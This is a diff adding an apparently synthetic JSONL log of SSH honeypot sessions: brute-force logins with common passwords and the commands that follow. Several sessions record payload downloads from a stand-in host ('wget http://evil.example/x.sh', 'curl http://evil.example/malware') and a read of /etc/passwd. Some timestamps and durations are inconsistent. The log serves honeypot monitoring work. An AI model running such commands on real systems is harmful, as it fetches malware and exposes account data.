@@ -1,0 +1,467 @@
+{"timestamp": "2026-11-18T09:03:19+00:00", "event": "session_start", "session_id": "7a61d7ed", "src_ip": "103.75.190.14", "src_port": 39401, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-18T09:03:20+00:00", "event": "login_attempt", "session_id": "7a61d7ed", "src_ip": "103.75.190.14", "src_port": 39401, "username": "postgres", "password": "test"}
+{"timestamp": "2026-11-18T09:03:29+00:00", "event": "command", "session_id": "7a61d7ed", "src_ip": "103.75.190.14", "src_port": 39401, "command": "curl http://evil.example/malware"}
+{"timestamp": "2026-11-18T09:03:32+00:00", "event": "command", "session_id": "7a61d7ed", "src_ip": "103.75.190.14", "src_port": 39401, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-18T09:03:44+00:00", "event": "command", "session_id": "7a61d7ed", "src_ip": "103.75.190.14", "src_port": 39401, "command": "exit"}
+{"timestamp": "2026-11-18T09:03:44+00:00", "event": "session_end", "session_id": "7a61d7ed", "src_ip": "103.75.190.14", "src_port": 39401, "username": "root", "duration_seconds": 24.77}
+{"timestamp": "2026-11-18T09:09:42+00:00", "event": "session_start", "session_id": "581f74f4", "src_ip": "45.155.205.233", "src_port": 58487, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-18T09:09:43+00:00", "event": "login_attempt", "session_id": "581f74f4", "src_ip": "45.155.205.233", "src_port": 58487, "username": "root", "password": "admin"}
+{"timestamp": "2026-11-18T09:09:52+00:00", "event": "command", "session_id": "581f74f4", "src_ip": "45.155.205.233", "src_port": 58487, "command": "hostname"}
+{"timestamp": "2026-11-18T09:09:55+00:00", "event": "command", "session_id": "581f74f4", "src_ip": "45.155.205.233", "src_port": 58487, "command": "ls"}
+{"timestamp": "2026-11-18T09:09:58+00:00", "event": "command", "session_id": "581f74f4", "src_ip": "45.155.205.233", "src_port": 58487, "command": "uname -a"}
+{"timestamp": "2026-11-18T09:10:01+00:00", "event": "command", "session_id": "581f74f4", "src_ip": "45.155.205.233", "src_port": 58487, "command": "id"}
+{"timestamp": "2026-11-18T09:10:07+00:00", "event": "command", "session_id": "581f74f4", "src_ip": "45.155.205.233", "src_port": 58487, "command": "exit"}
+{"timestamp": "2026-11-18T09:10:19+00:00", "event": "session_end", "session_id": "581f74f4", "src_ip": "45.155.205.233", "src_port": 58487, "username": "root", "duration_seconds": 8.93}
+{"timestamp": "2026-11-18T09:58:04+00:00", "event": "session_start", "session_id": "326490ef", "src_ip": "45.148.10.32", "src_port": 53194, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-18T09:58:05+00:00", "event": "login_attempt", "session_id": "326490ef", "src_ip": "45.148.10.32", "src_port": 53194, "username": "root", "password": "admin123"}
+{"timestamp": "2026-11-18T09:58:14+00:00", "event": "command", "session_id": "326490ef", "src_ip": "45.148.10.32", "src_port": 53194, "command": "uname -a"}
+{"timestamp": "2026-11-18T09:58:17+00:00", "event": "command", "session_id": "326490ef", "src_ip": "45.148.10.32", "src_port": 53194, "command": "curl http://evil.example/malware"}
+{"timestamp": "2026-11-18T09:58:20+00:00", "event": "command", "session_id": "326490ef", "src_ip": "45.148.10.32", "src_port": 53194, "command": "whoami"}
+{"timestamp": "2026-11-18T09:58:23+00:00", "event": "command", "session_id": "326490ef", "src_ip": "45.148.10.32", "src_port": 53194, "command": "cat notes.txt"}
+{"timestamp": "2026-11-18T09:58:29+00:00", "event": "command", "session_id": "326490ef", "src_ip": "45.148.10.32", "src_port": 53194, "command": "exit"}
+{"timestamp": "2026-11-18T09:58:42+00:00", "event": "session_end", "session_id": "326490ef", "src_ip": "45.148.10.32", "src_port": 53194, "username": "root", "duration_seconds": 22.29}
+{"timestamp": "2026-11-18T11:00:05+00:00", "event": "session_start", "session_id": "4c4f0d5b", "src_ip": "45.148.10.32", "src_port": 54692, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-18T11:00:06+00:00", "event": "login_attempt", "session_id": "4c4f0d5b", "src_ip": "45.148.10.32", "src_port": 54692, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-18T11:00:15+00:00", "event": "command", "session_id": "4c4f0d5b", "src_ip": "45.148.10.32", "src_port": 54692, "command": "whoami"}
+{"timestamp": "2026-11-18T11:00:30+00:00", "event": "command", "session_id": "4c4f0d5b", "src_ip": "45.148.10.32", "src_port": 54692, "command": "exit"}
+{"timestamp": "2026-11-18T11:00:37+00:00", "event": "session_end", "session_id": "4c4f0d5b", "src_ip": "45.148.10.32", "src_port": 54692, "username": "root", "duration_seconds": 5.06}
+{"timestamp": "2026-11-18T11:05:46+00:00", "event": "session_start", "session_id": "7a8cfc96", "src_ip": "104.244.79.12", "src_port": 34723, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-18T11:05:47+00:00", "event": "login_attempt", "session_id": "7a8cfc96", "src_ip": "104.244.79.12", "src_port": 34723, "username": "user", "password": "password"}
+{"timestamp": "2026-11-18T11:05:49+00:00", "event": "login_attempt", "session_id": "7a8cfc96", "src_ip": "104.244.79.12", "src_port": 34723, "username": "oracle", "password": "test"}
+{"timestamp": "2026-11-18T11:05:51+00:00", "event": "login_attempt", "session_id": "7a8cfc96", "src_ip": "104.244.79.12", "src_port": 34723, "username": "oracle", "password": "admin123"}
+{"timestamp": "2026-11-18T11:06:26+00:00", "event": "session_end", "session_id": "7a8cfc96", "src_ip": "104.244.79.12", "src_port": 34723, "username": "root", "duration_seconds": 26.56}
+{"timestamp": "2026-11-18T11:40:54+00:00", "event": "session_start", "session_id": "381994fe", "src_ip": "185.220.101.7", "src_port": 58857, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-18T11:40:55+00:00", "event": "login_attempt", "session_id": "381994fe", "src_ip": "185.220.101.7", "src_port": 58857, "username": "root", "password": "qwerty"}
+{"timestamp": "2026-11-18T11:41:27+00:00", "event": "session_end", "session_id": "381994fe", "src_ip": "185.220.101.7", "src_port": 58857, "username": "root", "duration_seconds": 21.15}
+{"timestamp": "2026-11-18T11:49:48+00:00", "event": "session_start", "session_id": "007adc49", "src_ip": "45.155.205.233", "src_port": 52029, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-18T11:49:49+00:00", "event": "login_attempt", "session_id": "007adc49", "src_ip": "45.155.205.233", "src_port": 52029, "username": "user", "password": "ubuntu"}
+{"timestamp": "2026-11-18T11:49:51+00:00", "event": "login_attempt", "session_id": "007adc49", "src_ip": "45.155.205.233", "src_port": 52029, "username": "test", "password": "root"}
+{"timestamp": "2026-11-18T11:50:10+00:00", "event": "session_end", "session_id": "007adc49", "src_ip": "45.155.205.233", "src_port": 52029, "username": "root", "duration_seconds": 19.1}
+{"timestamp": "2026-11-18T12:23:11+00:00", "event": "session_start", "session_id": "92dd7571", "src_ip": "103.75.190.14", "src_port": 54135, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-18T12:23:12+00:00", "event": "login_attempt", "session_id": "92dd7571", "src_ip": "103.75.190.14", "src_port": 54135, "username": "pi", "password": "123123"}
+{"timestamp": "2026-11-18T12:23:14+00:00", "event": "login_attempt", "session_id": "92dd7571", "src_ip": "103.75.190.14", "src_port": 54135, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-18T12:23:43+00:00", "event": "session_end", "session_id": "92dd7571", "src_ip": "103.75.190.14", "src_port": 54135, "username": "root", "duration_seconds": 31.17}
+{"timestamp": "2026-11-18T13:14:15+00:00", "event": "session_start", "session_id": "baec040c", "src_ip": "185.220.101.7", "src_port": 36532, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-18T13:14:16+00:00", "event": "login_attempt", "session_id": "baec040c", "src_ip": "185.220.101.7", "src_port": 36532, "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-18T13:14:18+00:00", "event": "login_attempt", "session_id": "baec040c", "src_ip": "185.220.101.7", "src_port": 36532, "username": "ubuntu", "password": "ubuntu"}
+{"timestamp": "2026-11-18T13:14:25+00:00", "event": "command", "session_id": "baec040c", "src_ip": "185.220.101.7", "src_port": 36532, "command": "hostname"}
+{"timestamp": "2026-11-18T13:14:40+00:00", "event": "command", "session_id": "baec040c", "src_ip": "185.220.101.7", "src_port": 36532, "command": "exit"}
+{"timestamp": "2026-11-18T13:14:40+00:00", "event": "session_end", "session_id": "baec040c", "src_ip": "185.220.101.7", "src_port": 36532, "username": "root", "duration_seconds": 33.94}
+{"timestamp": "2026-11-18T14:22:19+00:00", "event": "session_start", "session_id": "e6ca5391", "src_ip": "178.128.90.55", "src_port": 55841, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-18T14:22:20+00:00", "event": "login_attempt", "session_id": "e6ca5391", "src_ip": "178.128.90.55", "src_port": 55841, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-18T14:22:49+00:00", "event": "session_end", "session_id": "e6ca5391", "src_ip": "178.128.90.55", "src_port": 55841, "username": "root", "duration_seconds": 27.42}
+{"timestamp": "2026-11-18T15:41:58+00:00", "event": "session_start", "session_id": "05c93131", "src_ip": "178.128.90.55", "src_port": 49870, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-18T15:41:59+00:00", "event": "login_attempt", "session_id": "05c93131", "src_ip": "178.128.90.55", "src_port": 49870, "username": "test", "password": "123123"}
+{"timestamp": "2026-11-18T15:42:01+00:00", "event": "login_attempt", "session_id": "05c93131", "src_ip": "178.128.90.55", "src_port": 49870, "username": "oracle", "password": "admin"}
+{"timestamp": "2026-11-18T15:42:03+00:00", "event": "login_attempt", "session_id": "05c93131", "src_ip": "178.128.90.55", "src_port": 49870, "username": "git", "password": "123123"}
+{"timestamp": "2026-11-18T15:42:38+00:00", "event": "session_end", "session_id": "05c93131", "src_ip": "178.128.90.55", "src_port": 49870, "username": "root", "duration_seconds": 7.91}
+{"timestamp": "2026-11-18T17:40:30+00:00", "event": "session_start", "session_id": "2b6180b2", "src_ip": "89.248.165.71", "src_port": 44689, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-18T17:40:31+00:00", "event": "login_attempt", "session_id": "2b6180b2", "src_ip": "89.248.165.71", "src_port": 44689, "username": "admin", "password": "ubuntu"}
+{"timestamp": "2026-11-18T17:40:40+00:00", "event": "command", "session_id": "2b6180b2", "src_ip": "89.248.165.71", "src_port": 44689, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-18T17:40:43+00:00", "event": "command", "session_id": "2b6180b2", "src_ip": "89.248.165.71", "src_port": 44689, "command": "netstat -tulpn"}
+{"timestamp": "2026-11-18T17:40:46+00:00", "event": "command", "session_id": "2b6180b2", "src_ip": "89.248.165.71", "src_port": 44689, "command": "ls"}
+{"timestamp": "2026-11-18T17:40:51+00:00", "event": "session_end", "session_id": "2b6180b2", "src_ip": "89.248.165.71", "src_port": 44689, "username": "root", "duration_seconds": 34.96}
+{"timestamp": "2026-11-18T17:40:55+00:00", "event": "command", "session_id": "2b6180b2", "src_ip": "89.248.165.71", "src_port": 44689, "command": "exit"}
+{"timestamp": "2026-11-18T18:21:38+00:00", "event": "session_start", "session_id": "2c83809e", "src_ip": "103.75.190.14", "src_port": 32226, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-18T18:21:39+00:00", "event": "login_attempt", "session_id": "2c83809e", "src_ip": "103.75.190.14", "src_port": 32226, "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-18T18:21:48+00:00", "event": "command", "session_id": "2c83809e", "src_ip": "103.75.190.14", "src_port": 32226, "command": "id"}
+{"timestamp": "2026-11-18T18:21:51+00:00", "event": "command", "session_id": "2c83809e", "src_ip": "103.75.190.14", "src_port": 32226, "command": "uname -a"}
+{"timestamp": "2026-11-18T18:21:54+00:00", "event": "command", "session_id": "2c83809e", "src_ip": "103.75.190.14", "src_port": 32226, "command": "netstat -tulpn"}
+{"timestamp": "2026-11-18T18:22:03+00:00", "event": "command", "session_id": "2c83809e", "src_ip": "103.75.190.14", "src_port": 32226, "command": "exit"}
+{"timestamp": "2026-11-18T18:22:08+00:00", "event": "session_end", "session_id": "2c83809e", "src_ip": "103.75.190.14", "src_port": 32226, "username": "root", "duration_seconds": 12.16}
+{"timestamp": "2026-11-18T18:56:29+00:00", "event": "session_start", "session_id": "510eb414", "src_ip": "185.220.101.7", "src_port": 43580, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-18T18:56:30+00:00", "event": "login_attempt", "session_id": "510eb414", "src_ip": "185.220.101.7", "src_port": 43580, "username": "deploy", "password": "1234"}
+{"timestamp": "2026-11-18T18:56:49+00:00", "event": "session_end", "session_id": "510eb414", "src_ip": "185.220.101.7", "src_port": 43580, "username": "root", "duration_seconds": 31.78}
+{"timestamp": "2026-11-18T22:26:03+00:00", "event": "session_start", "session_id": "993eef82", "src_ip": "45.148.10.32", "src_port": 43193, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-18T22:26:04+00:00", "event": "login_attempt", "session_id": "993eef82", "src_ip": "45.148.10.32", "src_port": 43193, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-18T22:26:06+00:00", "event": "login_attempt", "session_id": "993eef82", "src_ip": "45.148.10.32", "src_port": 43193, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-18T22:26:08+00:00", "event": "login_attempt", "session_id": "993eef82", "src_ip": "45.148.10.32", "src_port": 43193, "username": "user", "password": "12345678"}
+{"timestamp": "2026-11-18T22:26:13+00:00", "event": "command", "session_id": "993eef82", "src_ip": "45.148.10.32", "src_port": 43193, "command": "ls"}
+{"timestamp": "2026-11-18T22:26:28+00:00", "event": "command", "session_id": "993eef82", "src_ip": "45.148.10.32", "src_port": 43193, "command": "exit"}
+{"timestamp": "2026-11-18T22:26:43+00:00", "event": "session_end", "session_id": "993eef82", "src_ip": "45.148.10.32", "src_port": 43193, "username": "root", "duration_seconds": 34.98}
+{"timestamp": "2026-11-18T22:43:28+00:00", "event": "session_start", "session_id": "24829ff2", "src_ip": "104.244.79.12", "src_port": 35451, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-18T22:43:29+00:00", "event": "login_attempt", "session_id": "24829ff2", "src_ip": "104.244.79.12", "src_port": 35451, "username": "root", "password": "qwerty"}
+{"timestamp": "2026-11-18T22:43:31+00:00", "event": "login_attempt", "session_id": "24829ff2", "src_ip": "104.244.79.12", "src_port": 35451, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-18T22:43:33+00:00", "event": "login_attempt", "session_id": "24829ff2", "src_ip": "104.244.79.12", "src_port": 35451, "username": "support", "password": "1234"}
+{"timestamp": "2026-11-18T22:43:38+00:00", "event": "command", "session_id": "24829ff2", "src_ip": "104.244.79.12", "src_port": 35451, "command": "ps aux"}
+{"timestamp": "2026-11-18T22:43:53+00:00", "event": "command", "session_id": "24829ff2", "src_ip": "104.244.79.12", "src_port": 35451, "command": "exit"}
+{"timestamp": "2026-11-18T22:44:00+00:00", "event": "session_end", "session_id": "24829ff2", "src_ip": "104.244.79.12", "src_port": 35451, "username": "root", "duration_seconds": 23.59}
+{"timestamp": "2026-11-18T23:08:56+00:00", "event": "session_start", "session_id": "851c86e7", "src_ip": "103.75.190.14", "src_port": 34400, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-18T23:08:57+00:00", "event": "login_attempt", "session_id": "851c86e7", "src_ip": "103.75.190.14", "src_port": 34400, "username": "admin", "password": "letmein"}
+{"timestamp": "2026-11-18T23:09:26+00:00", "event": "session_end", "session_id": "851c86e7", "src_ip": "103.75.190.14", "src_port": 34400, "username": "root", "duration_seconds": 11.11}
+{"timestamp": "2026-11-18T23:33:49+00:00", "event": "session_start", "session_id": "db960215", "src_ip": "185.220.101.7", "src_port": 43931, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-18T23:33:50+00:00", "event": "login_attempt", "session_id": "db960215", "src_ip": "185.220.101.7", "src_port": 43931, "username": "deploy", "password": "raspberry"}
+{"timestamp": "2026-11-18T23:34:12+00:00", "event": "session_end", "session_id": "db960215", "src_ip": "185.220.101.7", "src_port": 43931, "username": "root", "duration_seconds": 18.69}
+{"timestamp": "2026-11-18T23:45:37+00:00", "event": "session_start", "session_id": "213df2a7", "src_ip": "193.32.127.88", "src_port": 30841, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-18T23:45:38+00:00", "event": "login_attempt", "session_id": "213df2a7", "src_ip": "193.32.127.88", "src_port": 30841, "username": "pi", "password": "1234"}
+{"timestamp": "2026-11-18T23:45:40+00:00", "event": "login_attempt", "session_id": "213df2a7", "src_ip": "193.32.127.88", "src_port": 30841, "username": "postgres", "password": "letmein"}
+{"timestamp": "2026-11-18T23:46:06+00:00", "event": "session_end", "session_id": "213df2a7", "src_ip": "193.32.127.88", "src_port": 30841, "username": "root", "duration_seconds": 30.51}
+{"timestamp": "2026-11-19T00:12:01+00:00", "event": "session_start", "session_id": "37f86ff5", "src_ip": "45.148.10.32", "src_port": 54299, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-19T00:12:02+00:00", "event": "login_attempt", "session_id": "37f86ff5", "src_ip": "45.148.10.32", "src_port": 54299, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-19T00:12:38+00:00", "event": "session_end", "session_id": "37f86ff5", "src_ip": "45.148.10.32", "src_port": 54299, "username": "root", "duration_seconds": 7.61}
+{"timestamp": "2026-11-19T00:29:29+00:00", "event": "session_start", "session_id": "7d4c7b3c", "src_ip": "91.240.118.101", "src_port": 33849, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-19T00:29:30+00:00", "event": "login_attempt", "session_id": "7d4c7b3c", "src_ip": "91.240.118.101", "src_port": 33849, "username": "deploy", "password": "12345678"}
+{"timestamp": "2026-11-19T00:30:04+00:00", "event": "session_end", "session_id": "7d4c7b3c", "src_ip": "91.240.118.101", "src_port": 33849, "username": "root", "duration_seconds": 12.31}
+{"timestamp": "2026-11-19T00:51:06+00:00", "event": "session_start", "session_id": "fb10d76a", "src_ip": "196.251.88.19", "src_port": 37693, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-19T00:51:07+00:00", "event": "login_attempt", "session_id": "fb10d76a", "src_ip": "196.251.88.19", "src_port": 37693, "username": "guest", "password": "qwerty"}
+{"timestamp": "2026-11-19T00:51:39+00:00", "event": "session_end", "session_id": "fb10d76a", "src_ip": "196.251.88.19", "src_port": 37693, "username": "root", "duration_seconds": 22.62}
+{"timestamp": "2026-11-19T01:28:46+00:00", "event": "session_start", "session_id": "e439aaa7", "src_ip": "193.32.127.88", "src_port": 36310, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-19T01:28:47+00:00", "event": "login_attempt", "session_id": "e439aaa7", "src_ip": "193.32.127.88", "src_port": 36310, "username": "support", "password": "123123"}
+{"timestamp": "2026-11-19T01:29:14+00:00", "event": "session_end", "session_id": "e439aaa7", "src_ip": "193.32.127.88", "src_port": 36310, "username": "root", "duration_seconds": 26.74}
+{"timestamp": "2026-11-19T01:31:50+00:00", "event": "session_start", "session_id": "b3c8972c", "src_ip": "193.32.127.88", "src_port": 48544, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-19T01:31:51+00:00", "event": "login_attempt", "session_id": "b3c8972c", "src_ip": "193.32.127.88", "src_port": 48544, "username": "pi", "password": "oracle"}
+{"timestamp": "2026-11-19T01:32:00+00:00", "event": "command", "session_id": "b3c8972c", "src_ip": "193.32.127.88", "src_port": 48544, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-19T01:32:03+00:00", "event": "command", "session_id": "b3c8972c", "src_ip": "193.32.127.88", "src_port": 48544, "command": "pwd"}
+{"timestamp": "2026-11-19T01:32:06+00:00", "event": "command", "session_id": "b3c8972c", "src_ip": "193.32.127.88", "src_port": 48544, "command": "ls -la"}
+{"timestamp": "2026-11-19T01:32:09+00:00", "event": "command", "session_id": "b3c8972c", "src_ip": "193.32.127.88", "src_port": 48544, "command": "cat /etc/passwd"}
+{"timestamp": "2026-11-19T01:32:15+00:00", "event": "command", "session_id": "b3c8972c", "src_ip": "193.32.127.88", "src_port": 48544, "command": "exit"}
+{"timestamp": "2026-11-19T01:32:30+00:00", "event": "session_end", "session_id": "b3c8972c", "src_ip": "193.32.127.88", "src_port": 48544, "username": "root", "duration_seconds": 31.75}
+{"timestamp": "2026-11-19T02:02:59+00:00", "event": "session_start", "session_id": "9d00f6be", "src_ip": "45.148.10.32", "src_port": 42403, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-19T02:03:00+00:00", "event": "login_attempt", "session_id": "9d00f6be", "src_ip": "45.148.10.32", "src_port": 42403, "username": "git", "password": "test"}
+{"timestamp": "2026-11-19T02:03:02+00:00", "event": "login_attempt", "session_id": "9d00f6be", "src_ip": "45.148.10.32", "src_port": 42403, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-19T02:03:28+00:00", "event": "session_end", "session_id": "9d00f6be", "src_ip": "45.148.10.32", "src_port": 42403, "username": "root", "duration_seconds": 34.56}
+{"timestamp": "2026-11-19T02:11:50+00:00", "event": "session_start", "session_id": "7363beaa", "src_ip": "143.110.210.9", "src_port": 48500, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-19T02:11:51+00:00", "event": "login_attempt", "session_id": "7363beaa", "src_ip": "143.110.210.9", "src_port": 48500, "username": "support", "password": "admin"}
+{"timestamp": "2026-11-19T02:12:00+00:00", "event": "command", "session_id": "7363beaa", "src_ip": "143.110.210.9", "src_port": 48500, "command": "hostname"}
+{"timestamp": "2026-11-19T02:12:03+00:00", "event": "command", "session_id": "7363beaa", "src_ip": "143.110.210.9", "src_port": 48500, "command": "ps aux"}
+{"timestamp": "2026-11-19T02:12:10+00:00", "event": "session_end", "session_id": "7363beaa", "src_ip": "143.110.210.9", "src_port": 48500, "username": "root", "duration_seconds": 13.32}
+{"timestamp": "2026-11-19T02:12:15+00:00", "event": "command", "session_id": "7363beaa", "src_ip": "143.110.210.9", "src_port": 48500, "command": "exit"}
+{"timestamp": "2026-11-19T04:44:24+00:00", "event": "session_start", "session_id": "7bc0e124", "src_ip": "91.240.118.101", "src_port": 36245, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-19T04:44:25+00:00", "event": "login_attempt", "session_id": "7bc0e124", "src_ip": "91.240.118.101", "src_port": 36245, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-19T04:44:57+00:00", "event": "session_end", "session_id": "7bc0e124", "src_ip": "91.240.118.101", "src_port": 36245, "username": "root", "duration_seconds": 15.2}
+{"timestamp": "2026-11-19T04:45:08+00:00", "event": "session_start", "session_id": "9e889ec2", "src_ip": "51.79.52.44", "src_port": 47701, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-19T04:45:09+00:00", "event": "login_attempt", "session_id": "9e889ec2", "src_ip": "51.79.52.44", "src_port": 47701, "username": "admin", "password": "oracle"}
+{"timestamp": "2026-11-19T04:45:11+00:00", "event": "login_attempt", "session_id": "9e889ec2", "src_ip": "51.79.52.44", "src_port": 47701, "username": "oracle", "password": "123123"}
+{"timestamp": "2026-11-19T04:45:18+00:00", "event": "command", "session_id": "9e889ec2", "src_ip": "51.79.52.44", "src_port": 47701, "command": "ls"}
+{"timestamp": "2026-11-19T04:45:21+00:00", "event": "command", "session_id": "9e889ec2", "src_ip": "51.79.52.44", "src_port": 47701, "command": "whoami"}
+{"timestamp": "2026-11-19T04:45:24+00:00", "event": "command", "session_id": "9e889ec2", "src_ip": "51.79.52.44", "src_port": 47701, "command": "cat notes.txt"}
+{"timestamp": "2026-11-19T04:45:33+00:00", "event": "command", "session_id": "9e889ec2", "src_ip": "51.79.52.44", "src_port": 47701, "command": "exit"}
+{"timestamp": "2026-11-19T04:45:41+00:00", "event": "session_end", "session_id": "9e889ec2", "src_ip": "51.79.52.44", "src_port": 47701, "username": "root", "duration_seconds": 20.78}
+{"timestamp": "2026-11-19T05:20:58+00:00", "event": "session_start", "session_id": "a157322a", "src_ip": "45.155.205.233", "src_port": 38704, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-19T05:20:59+00:00", "event": "login_attempt", "session_id": "a157322a", "src_ip": "45.155.205.233", "src_port": 38704, "username": "user", "password": "123123"}
+{"timestamp": "2026-11-19T05:21:08+00:00", "event": "command", "session_id": "a157322a", "src_ip": "45.155.205.233", "src_port": 38704, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-19T05:21:11+00:00", "event": "command", "session_id": "a157322a", "src_ip": "45.155.205.233", "src_port": 38704, "command": "pwd"}
+{"timestamp": "2026-11-19T05:21:14+00:00", "event": "command", "session_id": "a157322a", "src_ip": "45.155.205.233", "src_port": 38704, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-19T05:21:23+00:00", "event": "command", "session_id": "a157322a", "src_ip": "45.155.205.233", "src_port": 38704, "command": "exit"}
+{"timestamp": "2026-11-19T05:21:27+00:00", "event": "session_end", "session_id": "a157322a", "src_ip": "45.155.205.233", "src_port": 38704, "username": "root", "duration_seconds": 25.99}
+{"timestamp": "2026-11-19T05:21:34+00:00", "event": "session_start", "session_id": "2142b8f5", "src_ip": "103.75.190.14", "src_port": 31180, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-19T05:21:35+00:00", "event": "login_attempt", "session_id": "2142b8f5", "src_ip": "103.75.190.14", "src_port": 31180, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-19T05:21:37+00:00", "event": "login_attempt", "session_id": "2142b8f5", "src_ip": "103.75.190.14", "src_port": 31180, "username": "test", "password": "qwerty"}
+{"timestamp": "2026-11-19T05:22:05+00:00", "event": "session_end", "session_id": "2142b8f5", "src_ip": "103.75.190.14", "src_port": 31180, "username": "root", "duration_seconds": 11.3}
+{"timestamp": "2026-11-19T05:51:45+00:00", "event": "session_start", "session_id": "e5a29e21", "src_ip": "185.220.101.7", "src_port": 37010, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-19T05:51:46+00:00", "event": "login_attempt", "session_id": "e5a29e21", "src_ip": "185.220.101.7", "src_port": 37010, "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-19T05:52:17+00:00", "event": "session_end", "session_id": "e5a29e21", "src_ip": "185.220.101.7", "src_port": 37010, "username": "root", "duration_seconds": 32.15}
+{"timestamp": "2026-11-19T06:05:56+00:00", "event": "session_start", "session_id": "bcfbea39", "src_ip": "80.82.77.202", "src_port": 43594, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-19T06:05:57+00:00", "event": "login_attempt", "session_id": "bcfbea39", "src_ip": "80.82.77.202", "src_port": 43594, "username": "postgres", "password": "1234"}
+{"timestamp": "2026-11-19T06:05:59+00:00", "event": "login_attempt", "session_id": "bcfbea39", "src_ip": "80.82.77.202", "src_port": 43594, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-19T06:06:01+00:00", "event": "login_attempt", "session_id": "bcfbea39", "src_ip": "80.82.77.202", "src_port": 43594, "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-19T06:06:33+00:00", "event": "session_end", "session_id": "bcfbea39", "src_ip": "80.82.77.202", "src_port": 43594, "username": "root", "duration_seconds": 32.05}
+{"timestamp": "2026-11-19T06:47:44+00:00", "event": "session_start", "session_id": "e90db501", "src_ip": "45.148.10.32", "src_port": 43848, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-19T06:47:45+00:00", "event": "login_attempt", "session_id": "e90db501", "src_ip": "45.148.10.32", "src_port": 43848, "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-19T06:47:54+00:00", "event": "command", "session_id": "e90db501", "src_ip": "45.148.10.32", "src_port": 43848, "command": "ps aux"}
+{"timestamp": "2026-11-19T06:47:57+00:00", "event": "command", "session_id": "e90db501", "src_ip": "45.148.10.32", "src_port": 43848, "command": "id"}
+{"timestamp": "2026-11-19T06:48:00+00:00", "event": "command", "session_id": "e90db501", "src_ip": "45.148.10.32", "src_port": 43848, "command": "hostname"}
+{"timestamp": "2026-11-19T06:48:05+00:00", "event": "session_end", "session_id": "e90db501", "src_ip": "45.148.10.32", "src_port": 43848, "username": "root", "duration_seconds": 26.89}
+{"timestamp": "2026-11-19T06:48:09+00:00", "event": "command", "session_id": "e90db501", "src_ip": "45.148.10.32", "src_port": 43848, "command": "exit"}
+{"timestamp": "2026-11-19T08:21:34+00:00", "event": "session_start", "session_id": "19ac34fc", "src_ip": "45.148.10.32", "src_port": 53892, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-19T08:21:35+00:00", "event": "login_attempt", "session_id": "19ac34fc", "src_ip": "45.148.10.32", "src_port": 53892, "username": "pi", "password": "12345678"}
+{"timestamp": "2026-11-19T08:21:44+00:00", "event": "command", "session_id": "19ac34fc", "src_ip": "45.148.10.32", "src_port": 53892, "command": "hostname"}
+{"timestamp": "2026-11-19T08:21:47+00:00", "event": "command", "session_id": "19ac34fc", "src_ip": "45.148.10.32", "src_port": 53892, "command": "hostname"}
+{"timestamp": "2026-11-19T08:21:50+00:00", "event": "command", "session_id": "19ac34fc", "src_ip": "45.148.10.32", "src_port": 53892, "command": "ls"}
